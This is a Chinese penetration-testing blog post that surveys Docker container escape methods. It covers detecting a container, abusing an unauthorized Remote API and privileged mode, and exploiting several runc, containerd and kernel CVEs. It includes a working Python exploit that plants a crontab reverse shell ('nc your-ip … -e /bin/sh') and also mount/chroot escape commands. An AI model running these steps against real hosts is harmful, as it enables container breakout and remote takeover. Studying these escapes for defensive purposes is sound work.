---
title: "一些 Docker 逃逸漏洞"
slug: some-docker-escape-vulnerabilities
aliases: ["/2021/some-docker-escape-vulnerabilities.html"]
date: 2021-02-24 12:50:05
categories: ["网络安全"]
tags: ["CVE-2016-5195", "CVE-2020-15257", "CVE-2019-5736", "CVE-2019-14271", "Docker 逃逸"]
toc: true
draft: false
---

渗透测试中，常会拿到 Docker 环境的 Shell，为了扩展攻击面和进一步拿到有价值数据，不得不需要逃逸到宿主机上。所以查询了目前的 Docker 逃逸手法，做个复现总结。

## 判断是否为 Docker 环境

* 检查是否存在`/.dockerenv`文件（可能没有）；

```bash
  ls -la / | grep .dockerenv
  ```

![.dockerenv](https://oss.zjun.info/zjun.info/20210223160653.png?x-oss-process=image/watermark,size_20,text_emp1bkB6anVuLmluZm8=,color_AAAAAA)

* 检查`/proc/1/cgroup`文件内是否存在`docker`字符串；

```bash
  cat /proc/1/cgroup | grep docker
  ```

![/proc/1/cgroup](https://oss.zjun.info/zjun.info/20210223160913.png?x-oss-process=image/watermark,size_20,text_emp1bkB6anVuLmluZm8=,color_AAAAAA)

* 检测虚拟化环境（可能没有）。

```bash
  systemd-detect-virt -c
  ```

![systemd-detect-virt](https://oss.zjun.info/zjun.info/20210223161235.png?x-oss-process=image/watermark,size_20,text_emp1bkB6anVuLmluZm8=,color_AAAAAA)

## Docker 逃逸方法

### 配置不当引发 Docker 逃逸

#### Docker Remote API 未授权

可参考[vulhub](https://github.com/vulhub/vulhub/tree/master/docker/unauthorized-rce)的漏洞环境。利用方法是，我们随意启动一个容器，并将宿主机的 `/etc` 目录挂载到容器中，便可以任意读写文件了。我们可以将命令写入 crontab 配置文件，进行反弹 shell。

Exploit

```python
import docker

client = docker.DockerClient(base_url='http://your-ip:2375/')
data = client.containers.run('alpine:latest', r'''sh -c "echo '* * * * * /usr/bin/nc your-ip 21 -e /bin/sh' >> /tmp/etc/crontabs/root" ''', remove=True, volumes={'/etc': {'bind': '/tmp/etc', 'mode': 'rw'}})
```

Github 找到的一个利用工具：[docker_api_vul](https://github.com/Tycx2ry/docker_api_vul)

#### Docker 高危启动参数

当操作者执行 `--privileged`（特权模式）时，Docker 将允许容器访问宿主机上的所有设备，使用特权模式启动的容器时，docker 管理员可通过 mount 命令将外部宿主机磁盘设备挂载进容器内部，获取对整个宿主机的文件读写权限，此外还可以通过写入计划任务等方式在宿主机执行命令。。

例如 docker 管理员启动容器时使用了 `--privileged` 参数

```bash
sudo docker run -itd --privileged ubuntu:latest /bin/bash
```

在该容器内部查看磁盘信息

```bash
fdisk -l
```

![fdisk -l](https://oss.zjun.info/zjun.info/20210224103538.png?x-oss-process=image/watermark,size_20,text_emp1bkB6anVuLmluZm8=,color_AAAAAA)

可以发现宿主机磁盘信息，攻击者可以直接在容器内部挂载 `/dev/sda1` ，即可访问宿主机磁盘数据

```bash
mount /dev/sda1 /mnt
# 挂载/dev/sda1 磁盘
chroot /mnt
# 切换根目录至/mnt
```

![mount-chroot](https://oss.zjun.info/zjun.info/20210224103846.png?x-oss-process=image/watermark,size_20,text_emp1bkB6anVuLmluZm8=,color_AAAAAA)

到这里已经成功逃逸了，然后就是常规的写入定时计划反弹 shell 或者写入 ssh 密钥实现免密登陆等（与 redis 未授权相似）。

除特权模式外 Docker 通过 Namespace 实现六项资源隔离，包括主机名、用户权限、文件系统、网络、进程号、进程间通讯。但部分启动参数授予容器权限较大的权限，从而打破了资源隔离的界限。

```bash
--cap-add=SYS_ADMIN  # 启动时，允许执行 mount 特权操作，需获得资源挂载进行利用。
--net=host           # 启动时，绕过 Network Namespace
--pid=host           # 启动时，绕过 PID Namespace
--ipc=host           # 启动时，绕过 IPC Namespace
```

### 由 Docker 程序漏洞逃逸

#### CVE-2019-5736 - RunC 漏洞逃逸

**影响版本：**

Docker Version <=18.09.2
RunC Version <=1.0-rc6

**Exploit：**

<https://github.com/Frichetten/CVE-2019-5736-PoC>

![CVE-2019-5736-PoC](https://oss.zjun.info/zjun.info/20210224113620.png?x-oss-process=image/watermark,size_20,text_emp1bkB6anVuLmluZm8=,color_AAAAAA)

其中 payload 可设置为反弹 shell 命令。

#### CVE-2019-14271 - Docker cp 命令漏洞逃逸

**影响版本：**

18.09 < Docker Version < 19.03.1

Docker 采用 Golang 语言编写。存在漏洞的 Docker 版本采用 Go v1.11 编译。简单的说漏洞来源是因为 `docker cp` 时会调用辅助进程 `docker-tar` 。并且在运行时会加载多个 `libnss_*.so` 库。

`docker-tar` 的原理是 `chroot` 到容器中，归档其中请求的文件及目录，然后将生成的 `tar` 文件传回 Docker 守护进程，该进程负责将文件提取到宿主机上的目标目录中。

除了 chroot 到容器文件系统外，docker-tar 并没有被容器化。它是在 host 命名空间运行的，权限为 root 全新且不受限于 cgroups 或 seccomp。因此，通过注入代码到 docker-tar，恶意容器就可以获取 host 主机的完全 root 访问权限。

**攻击场景：**

* 容器运行含有恶意`libnss_*.so`库的镜像；
* 容器中含有被攻击者替换的`libnss_*.so`库。

漏洞利用可参考：[CVE-2019-14271：Docker copy 漏洞分析](https://xz.aliyun.com/t/6806)

#### CVE-2020-15257 - Containerd 漏洞逃逸

**影响版本：**

Containerd Version <= 1.3.7 / <=1.4.0 / <=1.4.1

可运行 `docker version` 查看其 `Containerd Version` 。

**Exploit：**

<https://github.com/cdk-team/CDK/>

### 由内核漏洞逃逸

#### CVE-2016-5195 - Dirty Cow 脏牛提权漏洞逃逸

**影响版本：**

Linux kernel >= 2.6.22（2007 年发行到 2016 年 10 月 18 日之间发行的 Linux 内核）

Dirty Cow（CVE-2016-5195）是 Linux 内核中的提权漏洞，通过它可实现 Docker 容器逃逸，获得 root 权限的 shell。Docker 与宿主机共享内核，因此容器需要运行在存在 Dirty Cow 漏洞的宿主机里。

**Exploit：**

<https://github.com/scumjr/dirtycow-vdso>

## 参考

* <https://www.cnblogs.com/xiaozi/p/13423853.html>
* <https://xz.aliyun.com/t/8558>
* <https://xz.aliyun.com/t/7881>
* <https://xz.aliyun.com/t/6806>
* <https://www.freebuf.com/vuls/260512.html>
* <https://github.com/vulhub/vulhub/tree/master/docker/unauthorized-rce>
